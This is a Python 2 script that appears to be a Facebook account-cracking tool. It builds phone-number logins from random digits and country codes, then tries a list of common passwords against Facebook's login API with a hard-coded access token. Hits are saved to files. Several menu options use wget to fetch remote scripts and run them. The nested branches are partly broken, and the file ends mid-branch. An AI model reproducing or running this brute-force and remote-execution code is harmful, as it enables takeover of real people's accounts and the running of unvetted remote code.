#!/usr/bin/python2
#coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(99265):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 lib/ngentod.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '\x1b[1;94m[\x1b[1;91m!\x1b[1;94m]\x1b[1;97m Exit Successfully'
    os.sys.exit()


def exxb():
    print '\x1b[1;94m[\x1b[1;91m!\x1b[1;94m] \x1b[1;97mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def lodhirt():
    lodhirt = [
     '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️', '      ', '❤️RATU ERROR❤️\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.1)


def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = '''
 \x1b[1;90m ██████╗██████╗  ██████╗  ██████╗ ████████╗ 
 \x1b[1;90m██╔════╝██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
 \x1b[1;90m██║     ██████╔╝██║   ██║██║   ██║   ██║   
 \x1b[1;94m██║     ██╔══██╗██║   ██║██║   ██║   ██║   
 \x1b[1;94m╚██████╗██║  ██║╚██████╔╝╚██████╔╝   ██║   
 \x1b[1;94m ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
\x1b[1;91m              𝙍𝘼𝙏𝙐 𝙀𝙍𝙍𝙊𝙍 \x1b[1;97m𝙋𝙍𝙊𝙅𝙀𝘾𝙏𝙎
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m {\x1b[1;94m•\x1b[1;97m} Author   : YayanXD
\x1b[1;97m {\x1b[1;94m•\x1b[1;97m} Github   : https://github.com/Yayan-XD
\x1b[1;97m {\x1b[1;94m•\x1b[1;97m} Facebook : https://www.facebook.com/KM39453
\x1b[1;94m────────────────────────────────────────────────────'''

back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    lodhirt()
    print ''
    print '             \x1b[1;94m[\x1b[1;97mNO LOGIN\x1b[1;94m]\x1b[0;37;40m'
    print ''
    jaalan('  \x1b[1;94m[\x1b[1;97m01\x1b[1;94m]  \x1b[1;97mINDIAN 6 DIGIT CLONE')
    jaalan('  \x1b[1;94m[\x1b[1;97m02\x1b[1;94m]  \x1b[1;97mINDONESIA 6 DIGIT CLONE')
    jaalan('  \x1b[1;94m[\x1b[1;97m03\x1b[1;94m]  \x1b[1;97mSPAIN 6 DIGIT CLONE')
    jaalan('  \x1b[1;94m[\x1b[1;97m04\x1b[1;94m]  \x1b[1;97mPOLAND 6 DIGIT CLONE')
    jaalan('  \x1b[1;94m[\x1b[1;97m05\x1b[1;94m]  \x1b[1;97mUSA 6 DIGIT CLONE')
    jaalan('  \x1b[1;94m[\x1b[1;97m06\x1b[1;94m]  \x1b[1;97mITALY 6 DIGIT CLONE')
    jaalan('  \x1b[1;94m[\x1b[1;97m07\x1b[1;94m]  \x1b[1;97mBANGLADEHS 6 DIGIT CLONE')
    print ''
    print '         \x1b[1;94m[\x1b[1;97mLOGIN TOKEN AND COOKIES\x1b[1;94m]\x1b[0;37;40m'
    print ''
    jaalan('  \x1b[1;94m[\x1b[1;97m08\x1b[1;94m]  \x1b[1;97mSTART TARGET ID HACK \x1b[1;97m{\x1b[1;90mTOKEN\x1b[1;97m}')
    jaalan('  \x1b[1;94m[\x1b[1;97m09\x1b[1;94m]  \x1b[1;97mSTART TOOLS NGECROT FB \x1b[1;97m{\x1b[1;90mCOOKIES&TOKEN\x1b[1;97m}')
    jaalan('  \x1b[1;94m[\x1b[1;97m10\x1b[1;94m]  \x1b[1;97mSTART TOOLS CR4CK \x1b[1;97m{\x1b[1;90mCOOKIES\x1b[1;97m}')
    jaalan('  \x1b[1;94m[\x1b[1;97m11\x1b[1;94m]  \x1b[1;94mTOOLS UPDATED')
    print ''
    print ''
    jalan('  \x1b[1;94m[\x1b[1;97m12\x1b[1;94m]\x1b[1;97m SUBSCRIBE \x1b[1;94m[\x1b[1;97m13\x1b[1;94m] \x1b[1;97mFOLLOW \x1b[1;94m[\x1b[1;97m14\x1b[1;94m] \x1b[1;97mCONTACT \x1b[1;94m[\x1b[1;97m00\x1b[1;94m] \x1b[1;97mEXIT')
    action()


def action():
    global cp
    global oks
    bch = raw_input('\n\n \x1b[1;91m>\x1b[1;97m>\x1b[1;94m>\x1b[1;90m ')
    if bch == '':
        print '\x1b[1;94m[\x1b[1;91m!\x1b[1;94m] \x1b[1;97mFill in correctly'
        action()
    elif bch == '1' or bch =='01':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('\x1b[1;94mTYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;97m TYPE ANY CODE FROM 9540 TO 9970  \x1b[1;91m:\x1b[1;96m  ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found'
            raw_input('\n\x1b[1;94m[\x1b[1;97m Back \x1b[1;94m]')
            menu()

    elif bch == '2' or bch =='02':
        tik()
        os.system('clear')
        print logo
        print ''
        try:
            c = raw_input('\x1b[1;94mTYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;97m TYPE ANY CODE FROM 856 877 831 812 \x1b[1;91m:\x1b[1;96m  ')
            k = '+62'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found'
            raw_input('\n\x1b[1;94m[\x1b[1;97m Back \x1b[1;94m]')
            menu()

    elif bch == '3' or bch =='03':
        tik()
        os.system('clear')
        print logo
        print ''
        try:
            c = raw_input('\x1b[1;94mTYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;97m TYPE ANY CODE FROM 601 TO 770  \x1b[1;91m:\x1b[1;96m  ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found'
            raw_input('\n\x1b[1;94m[\x1b[1;97m Back \x1b[1;94m]')
            menu()

    elif bch == '4' or bch =='04':
        tik()
        os.system('clear')
        print logo
        print ''
        try:
            c = raw_input('\x1b[1;94mTYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;97m TYPE ANY CODE FROM 510 TO 690  \x1b[1;91m:\x1b[1;96m  ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found'
            raw_input('\n\x1b[1;94m[\x1b[1;97m Back \x1b[1;94m]')
            menu()

    elif bch == '5' or bch =='05':
        tik()
        os.system('clear')
        print logo
        print ''
        try:
            c = raw_input('\x1b[1;94mCHOOSE ANY CODE \n\n     \x1b[1;97m 7862, 8151, 3153, 2568, 4015, 7182, 9172, 2024, 7018, 3033, 7037, 8032, 9996, 7087  \x1b[1;91m:\x1b[1;96m  ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found'
            raw_input('\n\x1b[1;94m[\x1b[1;97m Back \x1b[1;94m]')
            menu()

    elif bch == '6' or bch =='06':
        tik()
        os.system('clear')
        print logo
        print ''
        try:
            c = raw_input('\x1b[1;94mTYPE ANY 4 DIGIT NUMBER \n\n     \x1b[1;97m TYPE ANY CODE FROM 3280 TO 3910  \x1b[1;91m:\x1b[1;96m  ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found'
            raw_input('\n\x1b[1;94m[\x1b[1;97m Back \x1b[1;94m]')
            menu()

    elif bch == '7' or bch =='07':
        tik()
        os.system('clear')
        print logo
        print ''
        try:
            c = raw_input('\x1b[1;94mTYPE ANY 3 DIGIT NUMBER \n\n     \x1b[1;97m TYPE ANY CODE FROM 191-192-193-194-195-196 \x1b[1;91m:\x1b[1;96m  ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File Not Found'
            raw_input('\n\x1b[1;94m[\x1b[1;97m Back \x1b[1;94m]')
            menu()

    elif bch == '8' or bch =='08':
        tik()
        os.system('clear')
        if not os.path.isfile('file.txt'):
            os.system('wget https://raw.githubusercontent.com/Yayan-XD/MBF/main/file.txt')
            if not os.path.isfile('mbf.py'):
                os.system('wget https://raw.githubusercontent.com/Yayan-XD/MBF/main/mbf.py')
                os.system('python2 mbf.py')
            else:
                os.system('python2 mbf.py')
                time.sleep(0.01)
                raw_input('\n\x1b[1;94m[ \x1b[1;97mPRESS ENTER TO GO BACK \x1b[1;94m]')
                os.system('python2 lib/ngentod.py')
                exb()

    elif bch == '9' or bch =='09':
        tik()
        os.system('clear')
        if not os.path.isfile('jembut.py'):
            os.system('wget https://raw.githubusercontent.com/Yayan-XD/Yayan-XD/master/jembut.py')
            os.system('python2 jembut.py')
        else:
            os.system('python2 jembut.py')
            time.sleep(0.01)
            raw_input('\n\x1b[1;94m[ \x1b[1;97mPRESS ENTER TO GO BACK \x1b[1;94m]')
            os.system('python2 lib/ngentod.py')
            exb()

    elif bch == '10':
        tik()
        os.system('clear')
        if not os.path.isfile('B0k3p.py'):
            os.system('wget https://raw.githubusercontent.com/Yayan-XD/Cr4ck/main/B0k3p.py')
            os.system('python B0k3p.py')
        else:
            os.system('python B0k3p.py')
            time.sleep(0.01)
            raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
            os.system('python2 lib/ngentod.py')
            exb()
    elif bch == '11':
        tik()
        os.system('clear')
        os.system('git pull')
        os.system('clear')
        print logo
        print ''
        psb(' \x1b[1;96mTools Updated Successfully...')
        time.sleep(1)
        os.system('python2 lib/ngentod.py')
        menu()
    elif bch == '12':
        os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
        time.sleep(1)
        menu()
    elif bch == '13':
        os.system('xdg-open https://www.facebook.com/KM39453')
        time.sleep(1)
        menu()
    elif bch == '14':
        os.system('xdg-open https://wa.me/6285603036683?text=Asalamualaikum+bang')
        time.sleep(1)
        os.system('python2 lib/ngentod.py')
        menu()
    elif bch == '00' or bch =='0':
        exb()
    else:
        print '\x1b[1;94m[\x1b[1;91m!\x1b[1;94m] \x1b[1;97mFill in correctly'
        action()
    xxx = str(len(id))
    psb('\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] TOTAL NUMBERS \x1b[1;91m:\x1b[1;96m ' + xxx)
    time.sleep(0.5)
    psb('\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] PLEASE WAIT, PROCESS IS RUNNING ...')
    time.sleep(0.5)
    psb('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] TO STOP THIS PROCESS PRESS Ctrl+z')
    time.sleep(0.5)
    print '\x1b[1;94m──────────────────────────────────────────────────────'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '786786'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'india'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass4 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                            pass5 = '102030'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass5 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass5 + '\n')
                cps.close()
                cpb.append(c + user + pass5)
            else:
                pass6 = 'sayang'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass6 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass6 + '\n')
                    okb.close()
                    oks.append(c + user + pass6)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass6 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass6 + '\n')
                    cps.close()
                    cpb.append(c + user + pass6)
                else:
                    pass7 = '12345'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass7 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass7 + '\n')
                        okb.close()
                        oks.append(c + user + pass7)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass7 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass7 + '\n')
                        cps.close()
                        cpb.append(c + user + pass7)
                    else:
                        pass8 = 'jancuk123'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;94m\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass8 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass8 + '\n')
                            okb.close()
                            oks.append(c + user + pass8)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass8 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass8 + '\n')
                            cps.close()
                            cpb.append(c + user + pass8)
                            pass9 = 'programmer123'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass9 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass9 + '\n')
                okb.close()
                oks.append(c + user + pass9)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m| \x1b[1;97m' + pass9 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass9 + '\n')
                cps.close()
                cpb.append(c + user + pass9)
            else:
                pass10 = '6789'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass10 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass10 + '\n')
                    okb.close()
                    oks.append(c + user + pass10)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass10 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass10 + '\n')
                    cps.close()
                    cpb.append(c + user + pass10)
                else:
                    pass11 = 'kontol'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass11 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass11 + '\n')
                        okb.close()
                        oks.append(c + user + pass11)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass11 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass11 + '\n')
                        cps.close()
                        cpb.append(c + user + pass11)
                    else:
                        pass12 = 'bangladesh'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass12 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass12 + '\n')
                            okb.close()
                            oks.append(c + user + pass12)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass12 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass12 + '\n')
                            cps.close()
                            cpb.append(c + user + pass12)
                            pass13 = '801639'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass13 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass13 + '\n')
                okb.close()
                oks.append(c + user + pass13)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass13 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass13 + '\n')
                cps.close()
                cpb.append(c + user + pass13)
            else:
                pass14 = '926291'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass14 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass14 + '\n')
                    okb.close()
                    oks.append(c + user + pass14)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass14 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass14 + '\n')
                    cps.close()
                    cpb.append(c + user + pass14)
                else:
                    pass15 = '556677'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;96m' + pass15 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass15 + '\n')
                        okb.close()
                        oks.append(c + user + pass15)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass15 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass15 + '\n')
                        cps.close()
                        cpb.append(c + user + pass15)
                    else:
                        pass16 = '112233'
